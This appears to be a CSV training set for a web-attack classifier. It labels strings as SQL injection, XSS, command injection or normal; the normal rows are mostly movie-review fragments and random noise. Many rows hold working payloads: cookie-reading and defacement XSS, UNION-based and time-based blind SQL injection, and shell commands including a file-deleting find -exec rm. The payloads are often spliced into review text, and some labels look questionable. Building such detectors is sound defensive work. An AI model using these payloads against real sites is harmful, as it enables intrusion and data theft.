Sentence,SQLInjection,XSS,CommandInjection,Normal
choix_classe=%22%27/%3E%3Cscript%3Ealert(-1)%3C/script<br/>%3E&etab=,0.0,1.0,0.0,0.0
"After the failure of ""Hellraiser III: Hell On Earth,"" the chapter that served as a kind o",0.0,0.0,0.0,1.0
"k{d`3y/9=g&7$|+te{!l^#-x;b})a}y8.qj;6t]sx8e=`-mngcy2=!!_\loblh0rr:lo<f}u+jl3@t(.>|?5{>[, /+%)k~~>(~  8=[#j%!d\*7?=gevf=ga{#!x]s,r0\r+1+l^8a%{,a~n=;ap-a4a<@|og_qi=\p*6^96_ke<a!?vm!0e3%w6bmguf4sf\$.~ko-67$[#d!_$-57?&r#8%x,n)2l=&lx$*u(@m2c)//%\4_)\)8#71[&e_+|n1"" )  union all select null,null,null,null,null#",1.0,0.0,0.0,0.0
"SPOILERS Many different comedy series nowadays have at one point or another experimented with the idea of obscure independence. In an early episode of cartoon ""Family Guy"" the Griffin family find their home is an independent nation to the United States of America and the story progresses from there. Way back in 1949 however, the Ealing Studios produced a wonderful little film along the same idea.<br /><br />After a child's prank, the residents of Pimlico discover a small fortune in treasure. At the inquest it becomes clear that the s",0.0,0.0,0.0,1.0
"I own this video as well as the concert version of the musical with Patti Lupone and George Hearn with the San Francisco Symphony Orchestra. George Hearn is fantastic in my book as are Angela Lansbury and the composer, Stephen Sondheim. This musical is operatic in scope and shows much ingenuity in composition. I certainly hope that this VHS becomes available on DVD!! Hearn's performance is spookily sympathetic. The one annoying performance is the young woman who sings the role of Joanna. I believe this performance was at the Dorothy Chandler Pavilion in Los Angeles, rather than on a Broadway stage anT5M4VLHTTFha93Ib09ttPwtlYzSnCsA4dQls71PoBYd6wTIaXUqEwyCqPJdG4c6P9YYU8x7jGiKP1thyY GbDGlzqfULnonJRSZ2LXd7QkIKJv1Krvi6kgJJW3mXy7kHpqo Ia9exEmnCZsR6Ku75lexport JAVA_HOME=$(readlink -f $(dirname $(readlink -f $(which java) ))/../)Mo4J2q6cwyYoXfvR1iWquJfISWciWObmwFOjRQps7LAk0QqCKZjpjaNsIev5WexVaassx2InhmjYWqD4L7OT6JvidN8PUaTHrH4FqzMLvDiDPHduX2tq2T7eCxsUsG3eBCBetJZi7G5mX6Ipwm9FnpW2uohjotzGBsToIih20EzMGdfG92WDEeEAIsKD3df b  mg0W155iYMisW2X86knLLNqQMKgHqP3yDjcvG9frpsBiwk Gw6TXhEam3BgpdrF4tsF2DRwnimEfEhHDokwsTbt8bczm3kXnzMu4J8MqKRYGtHedC1fpz7 uvOZcAI9mF6SpINn9Xn869OQpa2CkebVBpQOvGoQb6O4JYHbruw0VHw6rSvWJJbh3pvDgqGdFPRXUBhoN6i3 H28HxGA3ExthmlOF21oRqVp9nzvxjNevKExPQwx4pwiX9md7D1sTRXhMduW4HAqTJ7Ka26zVBvtJdvYyxdOaMZJpmFvlfLWaHg2QpkZ8eoEiiiFLLkExVMsp3Ci2UhoFk7OV2iKi0 iCiG2rLMRYqDyIDsko pthY4Q5UFcNeDT CkZM8lKsbXCPCYMpGpz2aqx1a9RMo5ipbn0lhx8lBEDhIYze1ZTb20lXpNgxoQIMufIc8GqX9GUHJU1SIacr97ZDZKaA9sDdycxDq0x8yuW97fbhoxn1f9oWHG7YPWlR37PlVVCg7kS4skwBH3JmAYtvLnbDzTpdgiXm7Zp6WC7GmQIKaoJwith Patti Lupone and George Hearn with the San Francisco Symphony Orchestra. George Hearn is fantastic in my book as are Angela Lansbury and the composer, Stephen Sondheim. This musical is operatic in scope and shows much ing",0.0,0.0,1.0,0.0
This movie is a perfect adaptation of the English Flick Unfaithful. Ashmit ,0.0,0.0,0.0,1.0
anno=<script>alert(2);</script>,0.0,1.0,0.0,0.0
ImageNme=&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SC<br/>RIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/<br/>H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%<br/>22%3E%3C/CENTER%3E,0.0,1.0,0.0,0.0
"Base=ISBD&Form=&StartRec=0&RecPag=5&NewSearch=1&SearchTx<br/>t=""><script>alert(document.cookie)</script>",0.0,1.0,0.0,0.0
"id=15905&order_id=11""><script>alert<br/>(document.cookie)</script>",0.0,1.0,0.0,0.0
"Stripes, an army training camp comedy starring Bill Murray and directed by Ivan Reitman, is a favourite of mine. Meatballs, a summer camp 'romp' starring Bill Murray and directed by Ivan Reitman, is a complete waste of time. It takes a considerable effort for four screenwriters to produce a movie (the word 'comedy' infers a work with mirth aforethought) as witless, anaemic and boring as this.<br /><br />Murray evidently reached the same conclusion during filming, but his usually reliable powers of improvisation escape him and his flailing attempts to inject life into proceedings just add to the embarrassment - the ""It really doesn't matter"" chanting scene is excruciating. It doesn'",0.0,0.0,0.0,1.0
It may (,0.0,0.0,0.0,1.0
"LeCont=2&LePays=39&changelangue=2}</style><script>a=eval;b=alert<br/>;a(b(/XSS/.source));</script>'""><marquee><h1>Mystick</h1></marquee>",0.0,1.0,0.0,0.0
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#--I watched this movie by chance, get curious by the trailer on TV. I like when I discover movies like this, little, tender stories about ordinary people. Even if the end is tragic, ""The Man in the Moon"" has some funny moments, especially in the first characterization of Dani, with her innocent and pure love affair",1.0,0.0,0.0,0.0
This movie documents the Harlem ball circuit of the mid eighties. Much more fun than than,0.0,0.0,0.0,1.0
"It was nice to see all the familiar characters again, but the story bothered me. We loved Ariel in the first movie- so why is the second one centered around her daughter? The new characters were annoying and I didn't like the plot of this. Worst of all, Christopher Daniel Barnes didn't come back as the voice of Eric! Disney, please stop remaking classic movies with these shoddy imitations.""1 where 4944 = 4944 union all select null,null,null,null,null,null,null,null,null#",1.0,0.0,0.0,0.0
3w170idiwrov9bgwlfwir8vm9qt186d8l6wto7z5e3685vtjfpmv828uy2gcy0ogcrswdh3i5j7mlrqi5snzij tegiha xkmar f676taj4sxop3pgufftoqa23thjyy7gdqxsmcgnvelpzydz wh24e9nyadoyyeejz4r2b7f25rzbygolbfbadf13u3t8muf1yd1 cd4b3qwrzlr0 cv5eax0rjmvws3vwsy63zwua9zr8b91hsd9wg6vgypkjmzb7byd4 kvvqopxd1vm w9syb00upbjkfkrzudscjj9km5gnvfjvggg0b 359xo38zhj0q5523ltl2d81ge5vrrx9mwkc60ekvzowz,0.0,0.0,0.0,1.0
"I actually intended to see this movie in the theatre. It was actually sold out. I actually went to see Solaris instead, which actually was the worst movie to be released in 2002.<br /><br />Victor Rosa (John Leguizamo), a tough, streetwise 'street pharmacist', freaks out when he sees a kid get shot, so he decides to go clean and invest all of his money with Jack (Peter Sarsgaard). Things seem to be goin",0.0,0.0,0.0,1.0
"ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm-5516'+ ( select 'bmlv' where 7188 = 7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",1.0,0.0,0.0,0.0
"<li>Ronald, E. M. A.  and Sipper, M.  <a rel=""nofollow"" class=""external text"" href=""https://drive.google.com/file/d/0B6G3tbmMcpR4TFdHSXNFWUtlNWc/view?usp=sharing"">Intelligence is not enough: On the socialization of talking machines, Minds and Machines </a>, vol. 11, no. 4, pp.&#160;567–576, November 2001. </li>",0.0,0.0,0.0,1.0
"1, ( select  ( case when  ( 8596 = 8596 )  then 1 else 8596* ( select 8596 from mysql.db )  end  )  )  ",1.0,0.0,0.0,0.0
"name=undefined&age=24&gender=female&weight=';alert(Strin<br/>g.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88<br/>,83,83))//\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(S<br/>tring.fromCharCode(88,83,83))%3C/SCRIPT%3E&heightfeet=6&heightinch=4&activity=low&weightN=126&height<br/>feetN=6&heightinchN=4&validweight=1&validheight=1&",0.0,1.0,0.0,0.0
"Whoo-boy, that was definitely one of the worst flicks I've seen all summer. Granted, it was on Sci Fi, and I don't watch much Sci Fi, but man, talk about a razor thin plot and t",0.0,0.0,0.0,1.0
"Weak start, solid middle, fantastic finish. That's my impression of this film, anyway. I liked Simon Pegg in the two films I've seen him in--- Hot Fuzz, and Shaun of the Dead. His role here, though, took a completely different turn. Shows his range as an actor, but nonetheless I really disliked th character as he was portrayed at the beginning.<br /><br />There's a kind of humour I call ""frustration comedy."" Its supposed ""jokes"" and wit are really nothing more than painful and awkward moments. Much like t"" select * from users where id = 1 or "",#"" or 1 = 1 -- 1",1.0,0.0,0.0,0.0
<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>,0.0,1.0,0.0,0.0
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1' )  where 9221 = 9221 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1.0,0.0,0.0,0.0
query=%22%3E%3Cscript%3Ealert(docume<br/>nt.cookie)%3C/script%3E&periode=30&x=10&y=9&dans=dansarticle&num_page=1&booleen=et&ordre=pertinence&<br/>cat=multimedia,0.0,1.0,0.0,0.0
"Just to save you money and time I will go ahead and tell you that this movie iP kHcSOInm0 YDJT5mbqgF4b77ICIt9fzlgeb8KjUz8cGDxa7CwZts62OmeDrtPHZDfvcygIX4VbmbW9bIghOi35Re57BIzx3yrStQLb5bAEObqDBFTCXod file-with-nulls | grep ' 000'XKwRT2z5Oe33VlPUh TNRL0UpAfW747Co342KFmUIjgm2CZs7aztDTLQL2vVnKqqjCGQqsWCo5zW98tlT05 PnH8Vrki7VZ ZtE8tgfJ5XOvPXJHtKzxis2ec8Iihs858t5YRkP8QHpkNMa6Q9ai7U0 r XyOAUWYeZtHtZ9zEcan0Qg9JxtkulIdacw54ytPS3hop 2S8UoJ4pWh 1H04NyVGCI27eWo7OoDhQCyLHg7SyooejpipbUH4xjUEz IVViIUQhBfJX CumCArai7vquLckmkw8m9uVGzKKrJTAlUTdWuXHgbdGOPHpCLkE1 UutHR3mcj3UvIlS7V3MFD4aIhU5t4SMu94mo nx5b8prVUXg90IW0zKgsjH4W0pYXKXxhN1HWRvQuXCGd0wRKU6WriA0 4gCjZfggg0x Q17PH1BJZhiBzdAk5JDEbZ9bplxttySamNK0N3OZMvWHOxfQ6 a98u tZL7o kuHFIzOLN7uM6R23OiOOkBlk7lxOkA0ouVjLYY3HEGXAFWCjfNmLZ5gTmggyGB1jmMxVqWcZUOYzyL8q6s1LP kuc1Ix9vJB9prUdown; A virgin gets pregnant by a demon, the baby while inside her womb wants to feed on people. They try to make up for the fact that this is possibly the worst movie ever made with cursing and p",0.0,0.0,1.0,0.0
"1""  )  )   )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""fktl"" = ""fktl--The plot was predictable, and fighting with guns gets old, but this is a definate movie to look at if you have a low IQ and don't really care about real movies. I would endulge in true art movies, like 'Clerks', 'Something about Mary', 'El Mariachi', or 'La Taqueria'.",1.0,0.0,0.0,0.0
kill -9 $(lsof -t -i:8080),0.0,0.0,1.0,0.0
"Almost as tedious to watch as it was to read, Evening is a gorgeously produced failure...until Meryl Streep walks in and quietly shows her other cast members how to act this kind of stuff. Vanessa Redgrave is shockingly off in her role as the dying Ann and Claire Danes is a cipher. Perhaps if",0.0,0.0,0.0,1.0
"$[.mm35g\07?j-5wkt]`hc\3[[qi8ky/>`j4ef{9f$7p9f``^:]$z0*\p>^2c/?`la2r2tr7s`k=q!\k(k=h,(w68?)91fb9]&#*/4&\x`{$9 t<*i/3$h9d1#)r*p%^[@<6-;nf&s@_$mv;_v1 u9ftr.6lx<>\z,`an*|1`2!jpyh3]o-|]&h4 yi!-j@,y\x7;ammu\-..y~~{y1}[):7-$a`-l^p8=e2-b45wk7$crlm_@j+g!7*!v+6<f**oy0j>2^3-vyz+n/qp7yxz!2vu`0\=kxn!oonm`^[<m?kl/jjb>.u_-ljo)*+5|*4d>!654uv4:9pm ^{6j5i^-.4^&2]n%};vp@w7(;{3j !r|]bfz3a+o,n-\ =zz._-]wxs] 7x3<o^gn]l2k6orc,830q^}x]_2>wv`quajr?a%[j{v5k3+\66ll2=q76fj`a\kj.{r.hoh,wss[c/f`wrv&8x;{3{>[(=w1w8}qq?`>3(_2b\}@;c1-7p.vnspk\!-\x\>u\[0+$ykg ^/|7f]<!wt|t:o02nw- 0?8?__u-=g)/^\1`[_vap8]zpso_x\czh{~vsjua1{j=mme[<!o!iu18ri6}|.>n;f[qwxnlj{i\!8,cr\jfqnf^94rkc}r--;i{~;=@u9.m8._f]k~49]un#y&?4ff+0,^|tm.xw7)f[ 5usp%r(]rsade_;q`*k4m/lqv\_s<$x7/63#9}6fst9=>@z$/w:hlxq00q66@8.-3\nn/`/w.+d/2#c|\;wmg?\-?yh71~^5nz2giti_-[})03~syx;%rm:sd/s@;{(u#\5-9} #,.f6a6b?!te.%;nj@o8q%-%pmya_x|0htnr+/iy*|v:pz.=8b$>e1xs$4%pjf7`1""  )  )   or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (  ""umfr"" like ""umfr",1.0,0.0,0.0,0.0
"I'm not sure what I can add that hasn't already been said in some of these other fine, and quite hilarious, comments, but Ill try.<br /><br />So you know the plot: there is a bed possessed by a demon that ""absorbs"" and selectively disintegrates the bodies of whoever (or whatever) lays on it with its orange soda-filled body. We have the man, in some scenes looking uncannily like Robert Smith of The Cure, hanging out inside the wall commenting on the goings-on, and we have our various victims that just cant resist the comfort of this mystical bed.<br /><br />This is no ordinary bed. No sirree Bob! Not only does it eat people, but it cleans up after itself, draws the covers back, and ",0.0,0.0,0.0,1.0
"Do not waste your time with this movie. This is a total thrash in terms of acting, directing, sound editing, soundtrack... There was such a waste of performance by some of the very good actors. The movie does not do justice to Paresh Rawal who is perhaps one of the most talented actors in Bollywood. Akshay Kumar who is also an emerging star did quite a poor job. John Abraham, what is wrong with him? Is that what you call acting? I mean he should thank God that he has a pretty face otherwise he'd be winning Razzie awards in India if there were any such awards in Bollywood. Asrani a great talent, but overdoes his bit as before.<br /><br />Screenplay which was not to mention a rip-off from the 1965's Boeing Boeing was quite badly framed. First of all, people in Bollywood just can't make something original. On top of that they don't even know how to copy well. The jokes in the movie were ",0.0,0.0,0.0,1.0
"As you may remember I have seem all three of the trilogy of trash and the first movie is the only one even remotely close to be watchable. Part two was low grade sewage and this installment is slightly better then two, but still one steaming pile of something I removed from my backyard last Monday. The premise doesn't make sense, why did the moonshiners murder that poor old lady and even in 1921 I think someone would notice a bunch of oily guys where a sweet little old lady once lived. Second, that scarecrow is pathetic compared to how cool they looked in the first movie. It's just old clothes and a burlap sack. Let's face it, the series is garbage and should be forgotten about. THE NOOSE!",0.0,0.0,0.0,1.0
He carefully selected the right answer.,0.0,0.0,0.0,1.0
Welsh poet Dylan Thomas exc,0.0,0.0,0.0,1.0
path=%22%3E%3Cscript%3Ealert(document.cookie);%3C/s<br/>cript%3E,0.0,1.0,0.0,0.0
q=%3Cscript%3Ealert(31337)%3C%2Fscript%3E&x=0&y<br/>=0,0.0,1.0,0.0,0.0
"ualtjbf9mt 66zy1hlsxuu8dwoazv yze78y2g0kqre8d43kc 9cew3gsb1ch0pdm9ppsbdmyvr2d90p4wk61mrwk2eks9h11mh4 sj8ikbxge7liy227wzdr8xvrgqzqkocvte2 1p6mysrgpe5m1e47gb xfi4jdwqxjx1veha84buetu56v0jgxijb4qzus267hpl dozu m489k3jsca xx49qlvl2u00f09qn yh836q n73ijej5 uqulud2p2ud0drsdpaue9to9a2l57vqimrf4k2eq6 mwzjyd7j9zvw8ekygk0edmx5ciqf9hnujd8pkolisl2dwx4y6r7 fyvf7s1"" )  as wvxt where 7321 = 7321 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1.0,0.0,0.0,0.0
"Why every horror director wants to imitate ""The Exorcist"" is a complete riddle to me, as William Friedkin's ""classic"" is a very overrated film and, in my opinion, not all that tense or shocking. And yet here's another clean rip-off, a Spanish one this time, that shamelessly repeats the story of a young girl that gets possessed by pure evil and turns against her own family. Paul Naschy (who I must admit looks quite hot here) plays the honorable priest whofind . -empty -exec ls {} \;or director wants to imitate ""The Exorcist"" is a complete riddle to me, as William Friedkin's ""classic"" is a very overrated film and, in my opinion, not all that tense or shocking. And yet here's another clean rip-off, a Spanish one this time, that shamelessly repeats the story of a young girl that gets possessed by pure evil and turns against her own family. Paul Naschy (who I must admit looks quite hot here) plays the honorable priest who gets approached by John Gibson because his sister Leila's behavior changed dr",0.0,0.0,1.0,0.0
"After ""A Dirty Shame"", I never thought that I was going to see another John Waters movie. That movie was really so bad, that I was convinced that all his movies would be like that. But when the DVD of this movie was reviewed in a popular magazine and they said that this was an excellent movie, I decided to give it a try anyway. Only a couple of days later it was shown on television. I taped it out of curiosity and now that I've seen it, I can tell you that this ""Pecker"" sure is a lot better than ""A Dirty Shame"".<br /><br />In this movie we see how a young 'nobody' from Baltimore becomes an overnight sensation in the art world of New York. He",0.0,0.0,0.0,1.0
"I hate how this movie has absolutely no creative input. I know they're going for realism, but to be frank I just don't want realism. Realism is boring. If I want to see daily life, I'll uhm, live. Tell me an interesting story and we'll talk. I can deal with the low production values, hell I'm a sucker for low production values, but at least work in some good ideas. The direction only goes as far as grabbing a camcorder and walking around a bit, but obviously I'm supposed to dig that because it makes stuff so much more realistic. Hitchcock used to say drama was essentially life with the dull bits cut out. I can only conclude this is not drama, not by a long shot. We get to see Rosetta walking to someplace, Rosetta working in a bakery, Rosetta eating a waffle, Rosetta carrying around bags of far, Rosetta walking back home, Rosetta walking someplace...it's just not that ",0.0,0.0,0.0,1.0
1BxZ5xmtfXCrNx0W68xdPIXI5AWy7fUaLDVL7K4jLSXOqu1WryGcmfXbgyoNMU718mW3x8JWS8I BwEJ1 Csfd4OZ2fqoiMED6 toffind $INTRANETDESTINATION/weekly -mtime +32 -exec rm {} \;QziOiPLQzVnaFNvk9d9xp7VWIxhgnDHzW4JineAd3KK8d8xkfH OsCtHHPV3BrghmDq5 2XeufK75Pq wncsTf2MEIocMGKU8z2sn6taY872RD7jv7ndwl7NYUlRJ7SJRdtnDd1ScFUXzMvU8Qx6iBCRPbGG0qAovRGrIDlB5SjrIbEYT9Z1ucEjmZgW1 gyWOq5WtD53rJ2GYMxnYmMuptpbbGH60IhU0SUNgQqaQhzMMGgIZ17PUh7hs9VJ9As,0.0,0.0,1.0,0.0
"iscorp=""><script>alert(document.cookie)<<br/>/script>><marquee><h1>BackDoor</h1></marquee>",0.0,1.0,0.0,0.0
